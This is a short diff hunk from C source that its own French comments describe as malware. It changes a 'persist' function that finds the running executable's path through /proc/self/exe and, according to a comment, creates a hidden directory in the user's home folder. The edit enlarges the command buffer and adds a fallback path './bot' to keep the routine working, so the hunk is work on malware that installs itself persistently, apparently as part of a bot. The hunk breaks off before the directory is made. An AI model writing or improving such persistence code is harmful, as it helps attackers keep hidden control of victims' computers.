@@ -862,11 +862,17 @@
  // Fonction pour assurer la persistance du malware
  void persist() {
      char current_path[PATH_MAX];
-     char cmd[BUFFER_SIZE * 2];
+     char cmd[PATH_MAX + 100]; // Augmenter la taille pour éviter la troncature
      
      // Obtenir le chemin absolu de l'exécutable actuel
      if (readlink("/proc/self/exe", current_path, PATH_MAX) == -1) {
          return;
+     }
+     
+     // Vérifier que le chemin n'est pas trop long
+     if (strlen(current_path) >= PATH_MAX - 50) {
+         // Chemin trop long, utiliser un chemin relatif ou tronqué
+         strncpy(current_path, "./bot", PATH_MAX);
      }
      
      // Créer un répertoire caché dans le dossier personnel de l'utilisateur
